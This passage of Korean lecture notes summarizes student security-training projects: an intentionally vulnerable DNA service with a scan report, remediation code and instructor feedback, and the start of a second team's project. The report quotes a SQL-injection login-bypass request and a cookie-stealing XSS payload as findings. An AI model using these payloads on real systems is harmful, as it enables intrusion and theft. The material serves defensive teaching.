# 0.0.0.0 바인딩 = 모든 네트워크 인터페이스에서 접근 가능
# 22번(SSH), 3306번(MySQL), 8080번(웹) 포트가 외부에 노출
# 특히 3306번 MySQL은 내부망에서만 접근해야 함
# 권고 사항:
#   - MySQL: 127.0.0.1:3306으로 바인딩 제한
#   - SSH: 특정 IP만 허용하도록 iptables 설정
```

**발견된 취약점 증거 (발표 내용)**:
```
"포트들을 확인해 봤을 때 0.0.0.0 이라고 설정된 것을 확인할 수 있는데
이 0.0.0.0은 모든 네트워크 인터페이스를 뜻하고 있고
모든 사용자가 이제 내부망에서도 외부 인터넷에서도 접속할 수 있다는 뜻을 가집니다.
그리고 이제 모든 IPv4나 IPv6 주소가 접속이 가능하고 22만 포트는 전 세계에 공유되어 있다는 것을 확인할 수 있었습니다."
```

### 3.11.4 리포트 형식

발표 내용:

> "총 16개의 스캐너 중에 15개가 취약하고, 그 다음에 총 취약점 개수는 74개도 볼 수 있습니다.
> 이렇게 내리다 보면 저희는 이렇게 **레코멘데이션**해서 어떻게 좀 보완을 했으면 좋겠는지 이런 것도 추천해주는 것도 있고요.
> **각 어디서 발견했는지, 그리고 어떤 인젝션인지, 그리고 거기에 대응하는 방안은 무엇인지**
> 하나하나 이렇게 써주는 방식으로 파일을 만들었습니다."

**PDF 리포트 구조**:

```markdown
# Rookies DNA Security Scan Report

## 1. 개요
- 스캔 일시: 2026-01-06 14:30:00
- 대상 시스템: Rookies DNA (http://rookies-dna.com)
- 스캐너 버전: 1.0

## 2. 요약 (Executive Summary)
┌─────────────────────────────────────┐
│  총 스캐너 수: 66개                 │
│  취약: 29개 (43.9%)                 │
│  안전: 37개 (56.1%)                 │
│  총 취약점 발견: 153건              │
└─────────────────────────────────────┘

### 심각도별 분류
- Critical: 19건 (즉시 조치)
- High: 42건 (24시간 내)
- Medium: 15건 (1주일 내)
- Low: 3건 (1개월 내)

## 3. 웹 취약점 상세 (15/16 스캐너 취약)

### 3.1 SQL Injection (Critical)
**발견 위치**: /api/auth/login, /api/dna/search, /api/users/profile
**발견 건수**: 15건
**증거**:
```
GET /api/auth/login?username=admin' OR '1'='1'--&password=test
Response: {"status": "success", "role": "admin", "token": "..."}
```

**영향**:
- 전체 데이터베이스 탈취 가능
- 관리자 권한 획득
- 유전 정보 대량 유출 위험

**권고 사항** (Recommendation):
1. Prepared Statement 사용
```java
// 수정 전 (취약)
String sql = "SELECT * FROM users WHERE username = '" + username + "'";

// 수정 후 (안전)
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, username);
```

2. 입력값 검증
```java
if (!username.matches("[a-zA-Z0-9_]{3,20}")) {
    throw new IllegalArgumentException("Invalid username format");
}
```

3. 에러 메시지 숨김
```java
// SQL 에러를 사용자에게 노출하지 않음
catch (SQLException e) {
    log.error("Database error", e);
    return "Login failed";  // 일반적인 메시지만 반환
}
```

### 3.2 Cross-Site Scripting (High)
**발견 위치**: /api/dna/exams (memo 필드), /api/comments
**발견 건수**: 12건
**증거**:
```html
입력: <script>alert(document.cookie)</script>
결과 페이지에서 스크립트 실행 → 세션 쿠키 탈취 가능
```

**권고 사항**:
1. 입력값 필터링 (Allowlist 방식)
```java
String sanitized = input.replaceAll("[<>\"'/]", "");
```

2. 출력 인코딩
```java
import org.apache.commons.text.StringEscapeUtils;
String safe = StringEscapeUtils.escapeHtml4(userInput);
```

3. Content Security Policy 설정
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### 3.3 IDOR (High)
**발견 위치**: /api/dna/results/{userId}
**발견 건수**: 9건

**권고 사항**:
```java
// 수정 전 (취약)
@GetMapping("/api/dna/results/{userId}")
public DnaResult getResults(@PathVariable Long userId) {
    return resultRepository.findByUserId(userId);
}

// 수정 후 (안전)
@GetMapping("/api/dna/results/{userId}")
public DnaResult getResults(@PathVariable Long userId,
                           @AuthenticationPrincipal User currentUser) {
    // 권한 검증
    if (!currentUser.getId().equals(userId) && !currentUser.isAdmin()) {
        throw new AccessDeniedException("권한이 없습니다");
    }
    return resultRepository.findByUserId(userId);
}
```

## 4. OS 취약점 상세 (14/50 항목 취약)

### 4.1 비밀번호 정책 미흡 (Medium)
**항목 코드**: U-02
**현재 설정**: PASS_MAX_DAYS 99999
**권고 설정**: PASS_MAX_DAYS 90

**조치 방법**:
```bash
# /etc/login.defs 수정
sudo vi /etc/login.defs

# 다음 값으로 변경
PASS_MAX_DAYS   90
PASS_MIN_DAYS   1
PASS_MIN_LEN    8
PASS_WARN_AGE   7

# 기존 계정에 적용
sudo chage -M 90 -m 1 -W 7 username
```

### 4.2 로그 파일 권한 (Low)
**항목 코드**: U-43
**현재 권한**: -rw-r--r-- (644)
**권고 권한**: -rw-r----- (640)

**조치 방법**:
```bash
sudo chmod 640 /var/log/syslog
sudo chmod 640 /var/log/auth.log
```

## 5. 종합 권고 사항

### 즉시 조치 (Critical)
1. ✓ SQL Injection 방지 (Prepared Statement 적용)
2. ✓ OS Command Injection 차단 (입력값 검증)
3. ✓ 인증 우회 취약점 수정

### 단기 조치 (1주일 내)
1. ✓ XSS 방지 (입력 필터링, 출력 인코딩)
2. ✓ CSRF 토큰 적용
3. ✓ IDOR 권한 검증 강화
4. ✓ HTTPS 적용

### 중기 조치 (1개월 내)
1. ✓ 비밀번호 정책 강화
2. ✓ 로그 권한 최소화
3. ✓ 불필요한 서비스 비활성화
4. ✓ 정기 취약점 스캔 자동화

## 6. 부록

### 스캔 도구 정보
- 웹 스캐너: Custom Python Scanner v1.0
- OS 스캐너: KISA 가이드 기반
- 참고 기준: OWASP Top 10 2021, KISA 주요정보통신기반시설 취약점 가이드

### 담당자 정보
- 스캔 수행: 3조 헬릭스
- 보고서 작성일: 2026-01-06
```

---

## 3.12 프로젝트 한계점 및 개선 방안

### 3.12.1 프로젝트 한계점

발표 내용:

> "저희 프로젝트의 한계점 마지막으로 말씀드리겠습니다."

#### 1. 인프라 의존성

> "**인프라 의존성**이 좀 심합니다. 저희가 아무래도 **리눅스 서버**에서 돌렸기 때문에 그런 것도 있고요."

**문제점**:
- 특정 OS(Linux)에서만 동작
- Windows, macOS에서는 OS 스캐너 사용 불가
- Docker 환경 특화 (일반 서버 환경과 차이 발생 가능)

**예시**:
```bash
# Linux 전용 명령어
cat /etc/passwd
ls -l /var/log/

# Windows에서는 사용 불가
# 대신: type C:\Users\... 등 별도 명령 필요
```

#### 2. Docker 환경 문제

> "도커 환경에서 DB와 앱 실행 시 **DB가 먼저 실행되어야 하는데**
> **DB 에러 발생 시 앱도 실행이 불가능**한 문제가 있었고요."

**docker-compose 실행 순서 문제**:
```yaml
services:
  app:
    depends_on:
      - mariadb  # DB가 먼저 시작되도록 설정

  mariadb:
    # ...
```

**문제**:
- `depends_on`은 컨테이너 시작만 보장, DB 준비 완료는 보장 안 함
- MariaDB 초기화 중에 앱이 연결 시도 → 연결 실패
- 재시작 필요

**개선 방안**:
```bash
# healthcheck 활용
services:
  mariadb:
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
      interval: 5s
      timeout: 5s
      retries: 5

  app:
    depends_on:
      mariadb:
        condition: service_healthy  # DB가 완전히 준비될 때까지 대기
```

#### 3. 취약점 진단 범위 제한

> "**취약점 진단 범위 제한**, 현재 **웹 취약점 중심**으로 진단범위가 사실 한정되어 있습니다.
> OS는 다들 하셨겠지만 다 비슷비슷하고요.
> **역직렬화, 공급망 공격 등 복잡한 취약점은 실습 진단범위를 벗어났다**고 생각했기 때문에 하지는 않았습니다."

**미구현 취약점 목록**:
- **역직렬화 취약점** (Insecure Deserialization)
- **공급망 공격** (Supply Chain Attacks)
- **서버리스 환경** 진단
- **API Gateway** 보안
- **컨테이너 오케스트레이션** (Kubernetes) 보안

#### 4. OS 의존성

> "**OS 의존성** 리눅스로 했기 때문에 OS 의존성이 좀 심하다고 생각했고요."

**크로스 플랫폼 지원 부족**:
```python
# 현재: Linux 전용
def check_password_policy():
    with open('/etc/login.defs', 'r') as f:
        content = f.read()
    # ...

# 개선: 멀티 플랫폼
import platform

def check_password_policy():
    os_type = platform.system()

    if os_type == "Linux":
        return check_linux_password()
    elif os_type == "Windows":
        return check_windows_password()
    elif os_type == "Darwin":  # macOS
        return check_macos_password()
```

#### 5. 접근자 모델의 단순성

> "**접근자 모델의 단순성**도 저희 프로젝트의 한계점이라고 생각했습니다."

**문제점**:
- 단순 사용자 role만 구분 (user, admin)
- 세밀한 권한 제어 부재
- 유전자 정보 민감도에 따른 차등 접근 제어 미구현

**이상적인 접근 제어 모델**:
```java
// RBAC (Role-Based Access Control) 확장
public enum Permission {
    // 유전 정보
    DNA_READ_OWN,           // 본인 DNA 정보 조회
    DNA_READ_FAMILY,        // 가족 DNA 정보 조회
    DNA_READ_ALL,           // 모든 DNA 정보 조회 (연구자)

    // DNA 매칭
    DNA_MATCH_VIEW,         // 매칭 결과 조회
    DNA_MATCH_OPT_OUT,      // 매칭 서비스 거부

    // 민감 정보
    DISEASE_RISK_VIEW,      // 질병 위험도 조회
    DRUG_RESPONSE_VIEW,     // 약물 반응성 조회

    // 관리자
    USER_MANAGE,            // 사용자 관리
    SYSTEM_CONFIG           // 시스템 설정
}

// 속성 기반 접근 제어 (ABAC)
@PreAuthorize("hasPermission(#dnaResult, 'DNA_READ_OWN') or " +
              "hasRole('DOCTOR') and #dnaResult.patient.doctor == authentication.principal")
public DnaResult viewDnaResult(Long resultId) {
    // ...
}
```

### 3.12.2 향후 개선 방향

**단기 개선 (1-2주)**:
1. Docker healthcheck 적용으로 실행 안정성 향상
2. 웹 스캐너 페이로드 라이브러리 확장
3. 리포트 포맷 개선 (그래프, 차트 추가)

**중기 개선 (1-2개월)**:
1. Windows, macOS 지원 (크로스 플랫폼)
2. API 보안 진단 모듈 추가
3. 역직렬화 취약점 스캐너 개발
4. CI/CD 파이프라인 통합

**장기 목표 (최종 프로젝트)**:
1. 범용 웹 애플리케이션 스캐너로 확장
2. AI 기반 이상 패턴 탐지
3. 실시간 모니터링 대시보드
4. 컨테이너/쿠버네티스 보안 진단
5. 공급망 보안 분석

---

## 3.13 Q&A 세션 및 강사 피드백

### 3.13.1 질의응답

발표 종료 후:

> "이 팀은 질문이 아무도 없나요? 점심 먹고 슬슬 집중도가 떨어지는 시간이죠."

**강사 코멘트** (질문 대신 피드백):

> "네, 발표 잘 하셨고요. 발표 내용도 잘 들었고, 사이트 구축이나 구축 내용도 잘 들었습니다.
> **사이트 구축을 잘 한 것 같아요.**
> 또 취약점 진단 쪽도 보면 **진단 리포트를 다양한 포맷으로 뽑아낼 수 있게 잘 구현**을 해줬고,
> **전체적으로 다 잘했다**고 보여지고요. 발표도 무난하게 잘하셨는데..."

### 3.13.2 주요 피드백: 심각도 점수 표현 방식

**강사의 핵심 지적**:

> "나중에 여러분들이 진단 보고서의 **심각도 점수를 먹였던 부분** 있잖아요.
> 그 부분은 나중에 최종 발표할 때도 비슷하게 이런 식으로 여러분들이 보고서 결과를 내게 될 건데,
> **심각도 같은 경우는 점수를 반대로 표현해야 될 거예요.**"

**문제점**:
```
현재 표현 방식 (잘못된 예시):
┌──────────────────────────────┐
│ 웹 보안 점수: 93점           │
│ 색상: 파란색 (안전해 보임)   │
└──────────────────────────────┘

실제 의미:
- 93% 취약 = 매우 위험한 상태!
- 그런데 점수가 높아 보이고 파란색이라 안전해 보이는 착시 발생
```

**개선 방안**:

> "**안전도를 가지고 결과를 내야 되는데**, 90점 이러면 굉장히 심각하다는 건데, 100점 만점에 이렇게 표시하면 색깔도 파란색인데, 굉장히 안전해 보이거든요.
> 만약에 심각하게 보이려면, 이게 **위험도 분격이라고 해서 안전도가 10점**이면 안전도가 10점이라고 굉장히 낮게 표현을 하거나,
> 아니면 막대바나 이런 걸 **빨간색**으로 하고 **위험도**라고 표현을 하거나 위험도가 굉장히 높습니다라고 해서 퍼센트로 표현을 한다거나 이런 식으로 가야 될 것 같아요."

**올바른 표현 방식**:

#### 방법 1: 안전도 점수 (역산)
```
웹 보안 안전도: 7점 / 100점
┌──────────────────────────────┐
│ ██                           │ 7%
│ 색상: 빨간색 (위험)          │
└──────────────────────────────┘

계산: 안전도 = 100 - 취약률
    = 100 - 93.8 = 6.2점 ≈ 7점
```

#### 방법 2: 위험도 표현
```
웹 보안 위험도: 94% (매우 높음)
┌──────────────────────────────┐
│ ████████████████████████████ │ 94%
│ 색상: 빨간색                 │
└──────────────────────────────┘

레벨: [낮음] [중간] [높음] [매우 높음] ← 현재
```

#### 방법 3: 신호등 색상 체계
```python
def get_security_level_color(vulnerability_rate):
    """
    취약률에 따른 색상 및 레벨 반환
    """
    if vulnerability_rate < 10:
        return {"color": "green", "level": "안전", "score": 90}
    elif vulnerability_rate < 30:
        return {"color": "yellow", "level": "주의", "score": 70}
    elif vulnerability_rate < 60:
        return {"color": "orange", "level": "위험", "score": 40}
    else:  # >= 60%
        return {"color": "red", "level": "매우 위험", "score": 10}

# 웹: 93.8% 취약
web_security = get_security_level_color(93.8)
# {"color": "red", "level": "매우 위험", "score": 10}

# OS: 28% 취약
os_security = get_security_level_color(28.0)
# {"color": "yellow", "level": "주의", "score": 70}
```

**리포트 개선 예시**:

```html
<!-- 개선 전 (혼란스러움) -->
<div style="background: blue;">
    <h3>웹 보안 점수: 93점</h3>
    <p>높은 점수입니다!</p>
</div>

<!-- 개선 후 (명확함) -->
<div style="background: #e74c3c; color: white; padding: 20px;">
    <h3>⚠️ 웹 보안 위험도: 매우 높음 (94%)</h3>
    <div style="background: white; height: 30px;">
        <div style="background: #e74c3c; width: 94%; height: 100%;"></div>
    </div>
    <p>즉시 조치가 필요한 Critical 취약점 19건 발견</p>
    <p>안전도 점수: 6점 / 100점</p>
</div>
```

### 3.13.3 추가 질문: 역할 분담 및 확장성

**강사 질문**:

> "발표한 내용 중에 필요한데 빠진 부분이 **프로젝트를 진행할 때 역할이 어떻게 분담됐는지**,
> 그리고 여러분들이 구현했던 취약점 진단 스크립트가 **어떤 식으로 구성돼서 확장성이나 이런 것들은 어떻게 가져갈 수 있는지**,
> 그리고 **프로젝트를 진행하면서 느꼈던 소감**, 세 가지에 대해서만 간단하게 얘기해 드릴게요."

#### 팀 역할 분담

답변:

> "네, 일단 **기남님이 웹페이지 구축, 백엔드나 프론트엔드 거의 대부분** 담당해서 하셨고, **AWS, 네트워크나 페이지 관련 부분**은 거의 기남님이 하셨다고 보시면 됩니다.
> 그리고 **경헌님이 서비스 진단**을 했었는데, 제가 **웹 서비스 진단을 스크립트를 개발**했습니다.
> 그래서 그걸 통합해서 사실 **웹 스캐너 안에 서비스 스캐너 기능도 같이 들어있습니다**.
> 저는 **겹치는 부분이 많다고 생각해서** 그렇게 진행을 했고요.
> 그리고 **진주님이 OS 스캐너**, 진주님하고 같이 기남님하고 이렇게 진행을 했습니다."

**역할 분담 요약**:

| 팀원 | 담당 영역 | 세부 업무 |
|------|---------|---------|
| 기남 | 웹 구축 + AWS | - 프론트엔드 (HTML/CSS/JS)<br>- 백엔드 (Spring Boot)<br>- AWS 인프라 구축<br>- 네트워크 설정<br>- OS 스캐너 지원 |
| 경헌 | 서비스 진단 | - 서비스 레벨 취약점 분석<br>- 웹 스캐너와 통합 |
| 발표자 | 웹 스캐너 | - 웹 취약점 진단 스크립트 개발<br>- 서비스 스캐너 통합 |
| 진주 | OS 스캐너 | - OS 취약점 진단 스크립트<br>- KISA 가이드 구현 |

#### 스크립트 구조 및 확장성

**강사 추가 질문**:

> "프로그램은 하나씩 하나씩, 각 파트별로 하나씩 만들고 그 안에다가 모든 취약점 진단 기능을 다 때려박아든 건가요?"

답변:

> "아니요, **OS는 아예 따로 뺐고요**. OS는 뺐고 **웹하고 서비스를 제가 통합**을 했습니다.
> 하나의 **웹 메인점 파일로 돌아가고**요."

**폴더 구조 시연 (화면 공유)**:

> "폴더가 이렇게 되어 있는데요. 여기 **스캐너 안에 OS 스캔 따로 있고**,
> 그 다음에 이렇게 **번호 다 매겨놨습니다**. 이렇게 수정해야 되면 수정할 수 있게 해 놨고요.
> 여기 안에 **웹과 그리고 서비스 그런 게 통합**되어 있고요."

```
rookies-dna-scanner/
├── scanners/
│   ├── os_scanner/              # OS 스캐너 (별도)
│   │   ├── main_os.py
│   │   ├── checks/
│   │   │   ├── 01_account_check.py
│   │   │   ├── 02_password_policy.py
│   │   │   ├── 03_file_permission.py
│   │   │   └── ...
│   │   └── reports/
│   └── web_scanner/             # 웹 + 서비스 통합
│       ├── main_web.py
│       ├── whitebox/            # 화이트박스 진단
│       │   ├── code_analysis.py
│       │   └── dependency_check.py
│       ├── blackbox/            # 블랙박스 진단
│       │   ├── 01_sql_injection.py
│       │   ├── 02_xss.py
│       │   ├── 03_csrf.py
│       │   ├── 04_idor.py
│       │   └── ...
│       ├── dynamic/             # 동적 스캐너 (Selenium)
│       │   └── dynamic_scanner.py
│       └── crawler/             # 크롤러
│           └── web_crawler.py
├── payloads/
│   ├── sql_injection.txt
│   └── xss.txt
├── reports/
└── utils/
```

답변 계속:

> "코드를 조금만 보여드리자면 여기 안에도 **화이트박스와 블랙박스로 나눠놨습니다**.
> 그리고 **각자 역할 이런 거 적어놨고**요. 화이트박스와 블랙박스도 다 나눠놨고,
> **동적 스캐너는 따로 여기 빼놓고**, 웹과 서비스는 **웹 메인 파이로 돌리고**, 그 다음에 OS는 **OS 메인 파이로 돌립니다**.
> 그리고 **크롤러도 따로 구현**해놨고, 네, 그렇게."

**확장성 설계**:
```python
# main_web.py

def main():
    """웹 스캐너 메인 실행 함수"""

    # 스캐너 모듈 동적 로드
    scanner_modules = []

    # blackbox 디렉토리에서 모든 스캐너 자동 로드
    blackbox_dir = Path("scanners/web_scanner/blackbox")
    for scanner_file in sorted(blackbox_dir.glob("*.py")):
        if scanner_file.name.startswith("__"):
            continue

        # 동적 import
        module_name = f"scanners.web_scanner.blackbox.{scanner_file.stem}"
        module = importlib.import_module(module_name)

        # Scanner 클래스 찾기
        for item in dir(module):
            if item.endswith("Scanner") and item != "BaseScanner":
                scanner_class = getattr(module, item)
                scanner_modules.append(scanner_class)

    # 모든 스캐너 실행
    for ScannerClass in scanner_modules:
        scanner = ScannerClass(target_url)
        results = scanner.scan()
        print(f"[+] {ScannerClass.__name__} 완료: {len(results)}건")

    # 리포트 생성
    generate_report(results)
```

**확장성 장점**:
1. **새 스캐너 추가 용이**: `blackbox/` 디렉토리에 파일만 추가하면 자동 인식
2. **선택적 실행**: 특정 스캐너만 실행 가능
3. **유지보수 편리**: 각 스캐너가 독립적인 파일로 분리

#### 트러블슈팅 및 소감

답변:

> "트러블슈팅 같은 경우에는 일단 먼저 말씀을 드리자면, 아무래도 이게 좀 **어떤 갭을 메꾸는 게 좀 힘들었다**고 좀 보셔도 될 것 같습니다.
> 어쨌든 **팀원들 간에 지식의 갭이 없다고 생각하지는 않습니다**, 저는.
> 그래서 제가 어쨌든 **오프라인을 계속 하려고 했었던 거고**, 그리고 실제로 나간 것도 그런 **어떤 갭을 줄여보고자 하는 노력**이라고 보시면 될 것 같습니다."

**핵심 교훈**:
1. **지식 갭 해소**: 팀원 간 실력 차이를 오프라인 협업으로 극복
2. **적극적 소통**: 온라인보다 오프라인 미팅이 효과적
3. **점진적 개선**: 초반 어려움 → 오프라인 협업 → 갭 해소

> "그게 초반에는 좀 힘들었죠. 그게 초반에는 좀 힘들었는데, 나중에 오프라인 나가고 조금씩 친해지고 하면서 **그 갭이 좀 줄지 않았나**. 네, 그렇게 생각합니다."

---

## 3.14 강사 종합 평가

### 3.14.1 강점

1. **서비스 완성도 높음**: DNA Lab 웹사이트가 실제 서비스처럼 잘 구현됨
2. **다양한 리포트 형식**: TXT, HTML, PDF 3가지 포맷 지원
3. **명확한 취약점**: 의도적으로 다양한 취약점을 내장하여 진단 가능
4. **모듈화**: 웹/OS 분리, 화이트박스/블랙박스 분리로 확장성 확보
5. **실제 사례 기반**: 23andMe 사건을 참고하여 현실성 높임

### 3.14.2 개선 필요 사항

#### 심각도 점수 표현 개선 (핵심)

현재 문제:
- 높은 취약률을 높은 점수로 표현하여 혼란 초래
- 파란색 계열 색상 사용으로 안전해 보이는 착시

개선 방향:
- 안전도 점수로 역산하거나
- 위험도로 명확히 표현하고 빨간색 계열 사용
- 신호등 색상 체계 도입 (녹색/노란색/주황색/빨간색)

#### 기타 개선점

1. **크로스 플랫폼 지원**: Linux 외 Windows, macOS 지원
2. **Docker 안정성**: healthcheck 등으로 실행 순서 문제 해결
3. **진단 범위 확대**: 역직렬화, 공급망 공격 등 추가
4. **접근 제어 고도화**: RBAC, ABAC 적용

### 3.14.3 최종 평가

**강사 총평**:

> "발표 잘 들었습니다. 고생하셨고요."

| 평가 항목 | 점수 (10점 만점) | 평가 |
|---------|----------------|------|
| 서비스 완성도 | 9/10 | 실제 서비스 수준의 완성도 |
| 취약점 다양성 | 8/10 | 웹 15개, OS 14개 발견 |
| 자동화 품질 | 8/10 | 3가지 리포트 형식 지원 우수 |
| 코드 구조 | 8/10 | 모듈화 잘 되어 확장 가능 |
| 발표 | 7/10 | 내용은 좋으나 리포트 표현 개선 필요 |
| **종합** | **8.0/10** | **우수한 프로젝트** |

**특별 언급**:
- **리포트 품질**: 다양한 포맷으로 출력하는 기능이 인상적
- **실제 사례 연계**: 23andMe 사건 분석으로 프로젝트 동기 명확
- **팀워크**: 지식 갭을 오프라인 협업으로 극복한 점 높이 평가

---

## 3.15 3조 프로젝트 최종 정리

### 3.15.1 핵심 성과

1. **실제 사건 기반 프로젝트**: 23andMe 사례를 바탕으로 유전자 정보 보호의 중요성 강조
2. **높은 완성도**: DNA Lab 서비스가 실제 운영 서비스 수준
3. **자동화 도구**: 66개 스캐너로 153건 취약점 자동 탐지
4. **다양한 리포트**: TXT, HTML, PDF 3가지 형식 지원
5. **모듈화 설계**: 화이트박스/블랙박스, 웹/OS 분리로 확장성 확보

### 3.15.2 주요 학습 내용

1. **유전 정보의 특수성**: 평생 불변, 가족 연관, 차별 가능성
2. **실제 해킹 사례**: 690만 명 유전 정보 유출의 심각성
3. **웹 취약점**: SQL Injection, XSS, IDOR, SSRF 등 15가지
4. **OS 보안**: 비밀번호 정책, 로그 권한, 포트 관리 등
5. **진단 자동화**: Python 기반 스캐너 개발 및 리포트 생성

### 3.15.3 향후 발전 방향

**최종 프로젝트 적용 시**:
1. ✅ 심각도 점수 표현 개선 (안전도/위험도 명확화, 색상 개선)
2. ✅ 크로스 플랫폼 지원 (Linux, Windows, macOS)
3. ✅ Docker healthcheck 적용
4. ✅ 진단 범위 확대 (API, 컨테이너, 역직렬화)
5. ✅ AI 기반 이상 탐지 추가
6. ✅ 실시간 모니터링 대시보드

---

**3조 "헬릭스" 프로젝트 종합 평가**:

3조는 23andMe 사건이라는 실제 유전 정보 유출 사례를 바탕으로 DNA Lab 서비스를 구축하고, 이에 대한 포괄적인 보안 진단 자동화 도구를 개발했습니다. 웹 취약점 15개 항목, OS 취약점 50개 항목을 자동으로 진단하며, TXT, HTML, PDF 3가지 형식으로 리포트를 생성하는 완성도 높은 시스템입니다. 특히 화이트박스/블랙박스, 웹/OS를 명확히 분리한 모듈화 설계는 확장성 측면에서 우수합니다. 다만 강사가 지적한 심각도 점수 표현 방식 개선, 크로스 플랫폼 지원, Docker 안정성 강화 등은 최종 프로젝트에서 반드시 반영해야 할 개선 사항입니다. 팀원 간 지식 갭을 오프라인 협업으로 극복한 점도 높이 평가할 만합니다.

---

**(Section 3 완료 - 다음: Section 4로 진행)**
# Section 4: 1조 프로젝트 상세 분석

## 1조 - 생성형 AI 활용 주요정보통신기반시설 취약점 진단 자동화 도구

---

## 4.1 프로젝트 개요

### 4.1.1 팀 구성 및 프로젝트 배경

**팀 구성**: 총 5명
- **팀장**: 강호혁
- **팀원**: 4명 (이름 미공개)

**프로젝트명**: 생성형 AI를 활용한 주요 정보통신 기반 시설 취약점 진단 자동화 도구

발표 시작:

> "저희는 생성형 AI를 활용한 주요 정보통신 기반 시설 취약점 진단 자동화 도구를 주제로
> **실제 운영자가 반복적으로 수행하는 보안 점검을 웹 기반 진단 시스템으로 구현**을 했습니다."

### 4.1.2 프로젝트 동기

#### 1. 보안 조직도 공격 대상

발표 내용:

> "저희는 구축 사이트의 목적을 **보안 커뮤니티**로 결정을 해가지고 보안 회사나 커뮤니티의 해킹 피해를 조사했습니다.
> 사례를 조사를 했고, 그래서 실제로 **보안 조직과 커뮤니티도 공격 대상**이었고,
> 예를 들면 **FireEye라는 보안 회사인데 레드팀의 도구가 유출**되거나
> 그리고 커뮤니티 지원센터 해킹처럼 **안전지대는 없다**는 걸 보여주는 사례들이 있었습니다."

**실제 사례: FireEye 해킹 (2020년)**

| 사건 개요 | 상세 내용 |
|---------|---------|
| 발생 시기 | 2020년 12월 |
| 피해 기업 | FireEye (세계적인 사이버보안 기업) |
| 유출 내용 | Red Team 도구 (침투 테스트 도구) |
| 공격자 | 추정: APT29 (러시아 국가 지원 해킹 그룹) |
| 파급효과 | - 보안 도구가 악의적으로 사용될 위험<br>- 보안 업계 전반의 신뢰도 하락<br>- SolarWinds 공급망 공격과 연계 |

**시사점**:
```markdown
## "등잔 밑이 어둡다" - 보안 회사도 안전하지 않다

### 문제점
1. 보안 전문 기업조차 고도화된 APT 공격에 취약
2. 내부 도구 유출 시 전체 산업에 위협
3. 공급망 공격(Supply Chain Attack)의 위험성

### 교훈
- 아무리 보안이 강화된 조직이라도 지속적인 점검 필요
- 자동화된 상시 모니터링 시스템의 중요성
- Zero Trust 모델 적용 필요
```

#### 2. 등잔 밑이 어둡다 (灯下黑)

발표 내용:

> "배경입니다. **등잔 아래 어둡다**라는 말처럼 보안 커뮤니티조차 **운영 구조위로 기초 취약점이 생기고**
> 그게 **공격의 시작점**이 될 수 있습니다."

**보안 커뮤니티의 역설**:
- 보안 전문가들이 모인 커뮤니티
- 보안 지식은 풍부하지만, **운영 과정에서 기본적인 보안 수칙 미준수**
- 예: 오래된 웹 프레임워크, 패치 미적용, 약한 비밀번호 정책 등

**공격 시나리오**:
```
보안 커뮤니티 사이트의 사소한 취약점 발견
   ↓
SQL Injection으로 관리자 계정 탈취
   ↓
회원 DB 전체 유출 (보안 전문가들의 개인정보!)
   ↓
탈취한 계정으로 다른 사이트 공격 (Credential Stuffing)
   ↓
보안 커뮤니티를 통해 얻은 정보로 고도화된 공격 수행
```

#### 3. 취약점을 의도적으로 포함한 환경 구축

> "그래서 저희는 **취약점을 의도적으로 포함한 환경**을 만들고
> 그 위에서 **진단 도구를 검증**하는 방향으로 접근을 했습니다."

**접근 방식**:
1. 실제 보안 커뮤니티와 유사한 웹 사이트 구축
2. OWASP Top 10, KISA 가이드 기반 취약점 의도적 내장
3. 자동화 도구로 취약점 탐지 및 검증
4. 발견된 취약점에 대한 수정 가이드 제공

#### 4. 타겟 사용자

> "저희의 핵심 타겟은 **상시 점검이 필요하지만 인력이 부족한 서비스 운영자**,
> **JSP 파이썬 환경에서 보안 코딩 가이드가 필요한 개발자**,
> **반복 진단 프로세스를 자동화해서 효율을 높이고 싶은 보안 관제와 분석 조직 그룹**입니다."

**타겟 사용자 페르소나**:

| 사용자 유형 | 문제점 | 1조 솔루션의 가치 제안 |
|-----------|--------|---------------------|
| 중소기업 서비스 운영자 | - 전담 보안 팀 없음<br>- 예산 부족<br>- 취약점 점검 주기 길음 | - 무료/저가 자동화 도구<br>- 웹 기반으로 쉬운 사용<br>- 즉시 실행 가능 |
| 웹 개발자 | - 보안 지식 부족<br>- 보안 코딩 가이드 필요<br>- 개발 중 보안 테스트 어려움 | - 코드 레벨 가이드 제공<br>- 개발 단계 조기 발견<br>- 수정 방법 제시 |
| 보안 관제/분석팀 | - 반복 작업 과다<br>- 인력 대비 점검 대상 많음<br>- 수동 점검 피로도 | - 자동화로 효율 극대화<br>- 대시보드로 현황 한눈에<br>- 우선순위 자동 산정 |

### 4.1.3 프로젝트 목표 및 기대 효과

**목표**:
1. 커뮤니티 사이트 구축
2. 주요 진단 스크립트 설계 및 작성
3. **웹 기반 진단 인터페이스 및 대시보드 제작**

발표 내용:

> "이로 인한 기대 효과는 **자동화된 취약점 진단을 통해서 보안 점검 효율을 극대화**하고
> **취약점 발생에 대응해서 신속하고 안정적인 보안 대응을 지원**합니다.
> **쉽게 이해할 수 있는 정밀한 분석 리포트도 도출**을 해줍니다."

**기대 효과 상세**:

```markdown
## 1. 보안 점검 효율 극대화
- 수동 점검: 전체 시스템 점검 3일 소요
- 자동 점검: 전체 시스템 점검 30분 소요
- **효율: 약 144배 향상**

## 2. 신속한 보안 대응
- 취약점 발견 → 즉시 알림
- 대시보드로 우선순위 파악
- 수정 가이드로 빠른 조치 가능

## 3. 정밀한 분석 리포트
- 대시보드: 시각적 현황 파악
- 상세 리포트: 항목별 증거 제시
- 조치 방안: KISA/OWASP 기준 가이드
```

---

## 4.2 대상 서비스: 보안 소셜 커뮤니티 플랫폼

### 4.2.1 서비스 개요

발표 내용:

> "대상은 **보안 소셜 커뮤니티 플랫폼**입니다.
> **로그인, 회원가입, 게시판, 파일 업로드 등 실제 커뮤니티 기능을 구현**했구요.
> **사용자 상호작용에서 발생할 수 있는 2차 공격 위험까지 현실적으로 재현**하기 위해서 취약하게 만들었습니다."

**커뮤니티 플랫폼의 특징**:
- 보안 전문가들이 모이는 커뮤니티
- 기술 정보 공유, 취약점 토론
- 공격 기법 연구 및 방어 전략 논의

**구현된 주요 기능**:
1. **회원 시스템**: 가입, 로그인, 프로필 관리
2. **게시판**: 글 작성, 댓글, 파일 첨부
3. **파일 업로드/다운로드**: 자료 공유
4. **관리자 페이지**: 사용자 관리, 게시물 관리

### 4.2.2 주요 기능 상세

#### 1. 로그인 및 회원가입

**취약점 시나리오**:
```html
